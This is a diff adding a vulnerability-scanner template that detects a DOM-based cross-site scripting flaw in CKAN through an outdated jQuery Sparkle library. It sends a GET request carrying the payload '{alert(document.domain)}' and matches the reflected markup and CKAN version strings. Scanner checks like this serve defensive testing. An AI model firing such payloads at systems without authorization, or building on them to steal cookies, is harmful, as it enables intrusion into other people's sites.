@@ -1,0 +1,30 @@
+id: ckan-dom-based-xss
+name: CKAN - DOM Cross-Site Scripting
+severity: high
+confidence: confirmed
+description: CKAN contains a cross-site scripting vulnerability in the document object model via the previous version of the
+  jQuery Sparkle library. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials
+  and launch other attacks.
+reference: CWE-79
+tags:
+- dom
+- xss
+- vuln
+requests:
+- method: GET
+  path: /?{alert(document.domain)}
+  matchers:
+  - type: body
+    words:
+    - <option value="/en/?{alert(document.domain)}" selected="selected">
+  - type: body
+    words:
+    - ckan 2.3
+    - ckan 2.8.2
+  - type: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
